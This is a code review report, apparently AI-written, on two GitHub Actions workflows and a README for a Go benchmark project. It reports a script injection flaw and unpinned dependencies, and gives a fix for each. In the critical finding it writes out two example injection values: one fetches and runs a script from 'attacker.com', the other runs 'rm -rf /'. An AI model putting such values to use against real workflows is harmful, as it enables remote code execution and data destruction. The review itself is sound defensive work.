---
phase: 15-benchmark-gate-hardening
reviewed: 2026-04-10T12:00:00Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - .github/workflows/capture-baseline.yml
  - .github/workflows/bench.yml
  - test/bench/baselines/README.md
findings:
  critical: 1
  warning: 2
  info: 1
  total: 4
status: issues_found
---

# Phase 15: Code Review Report

**Reviewed:** 2026-04-10T12:00:00Z
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

Reviewed two GitHub Actions workflow files (`capture-baseline.yml`, `bench.yml`) and a documentation file (`test/bench/baselines/README.md`). The workflows are well-commented with thorough mitigation references. One critical script injection vulnerability was found in `capture-baseline.yml` where user-controlled `workflow_dispatch` input is interpolated directly into shell commands. Two supply-chain hardening gaps exist around unpinned third-party actions and Go tool installs.

## Critical Issues

### CR-01: Script injection via unsanitized workflow_dispatch input

**File:** `.github/workflows/capture-baseline.yml:51`
**Issue:** The `${{ inputs.milestone }}` expression is interpolated directly into shell `run:` blocks at lines 51, 55, and 66. GitHub Actions performs expression substitution *before* the shell executes, so a crafted milestone value (e.g., `v1.1$(curl attacker.com/x.sh|bash)` or `v1.1"; rm -rf /; echo "`) would execute arbitrary commands. While `workflow_dispatch` requires repo write access to trigger, this is still a recognized injection anti-pattern per GitHub's security hardening guidance and could be exploited by a compromised token or a malicious collaborator with write access.

**Fix:** Set the input as an environment variable and reference it via `$MILESTONE` in shell, which prevents expression-time injection:
```yaml
      - name: Run benchmark suite
        env:
          MILESTONE: ${{ inputs.milestone }}
        run: |
          set -euo pipefail
          go test -short -bench=. -benchmem -count=10 -run=^$ \
            ./test/bench/... | tee "test/bench/baselines/${MILESTONE}-github-hosted.txt"

      - name: Verify capture
        env:
          MILESTONE: ${{ inputs.milestone }}
        run: |
          LINES=$(grep -c "^Benchmark" "test/bench/baselines/${MILESTONE}-github-hosted.txt" || true)
          echo "Captured ${LINES} benchmark lines"
          if [ "${LINES}" -lt 5 ]; then
            echo "ERROR: Expected at least 5 benchmark lines, got ${LINES}"
            exit 1
          fi

      - name: Commit baseline
        uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "bench: capture ${{ inputs.milestone }} baseline from ubuntu-latest CI"
          file_pattern: 'test/bench/baselines/*.txt'
```
Note: The `commit_message` in the `with:` block (line 66) is not shell-interpolated so it is safe from command injection, though it could produce a malformed commit message with special characters.

## Warnings

### WR-01: Third-party action not pinned to commit SHA

**File:** `.github/workflows/capture-baseline.yml:63`
**Issue:** `stefanzweifel/git-auto-commit-action@v5` is pinned to a mutable major version tag, not an immutable commit SHA. This action runs with `contents: write` permission and auto-commits to the branch. A compromised or hijacked tag could inject arbitrary commits into the repository. The `actions/checkout@v4` and `actions/setup-go@v5` have the same pattern but are first-party GitHub actions with stronger trust guarantees.

**Fix:** Pin to a specific commit SHA. Look up the current v5 release SHA and use it:
```yaml
      - name: Commit baseline
        uses: stefanzweifel/git-auto-commit-action@<full-sha-here>  # v5.x.x
        with:
          commit_message: "bench: capture ${{ inputs.milestone }} baseline from ubuntu-latest CI"
          file_pattern: 'test/bench/baselines/*.txt'
```

### WR-02: benchstat installed from unpinned @latest

**File:** `.github/workflows/capture-baseline.yml:45`
**File:** `.github/workflows/bench.yml:63`
**Issue:** Both workflows install `benchstat@latest`. The `bench.yml` file already has a TODO acknowledging this (line 61). An upstream breaking change or supply-chain compromise to `golang.org/x/perf` would silently affect CI. Since `gopls` is already properly pinned, `benchstat` should receive the same treatment for consistency and supply-chain hygiene.

**Fix:** Pin benchstat to a specific version or commit hash in both workflows:
```yaml
      - name: Install benchstat
        run: go install golang.org/x/perf/cmd/benchstat@v0.0.0-20240604174448-3b48cf0e0164
```
Use `go install golang.org/x/perf/cmd/benchstat@latest` once to determine the current pseudo-version, then pin it.

## Info

### IN-01: TODO comment for supply-chain hardening

**File:** `.github/workflows/bench.yml:61`
**Issue:** Existing TODO comment: `# TODO: pin to a commit SHA for supply-chain hardening.` This is a known debt marker. WR-02 above covers the actionable fix.

**Fix:** Address the TODO by pinning benchstat per WR-02, then remove the comment.

---

_Reviewed: 2026-04-10T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
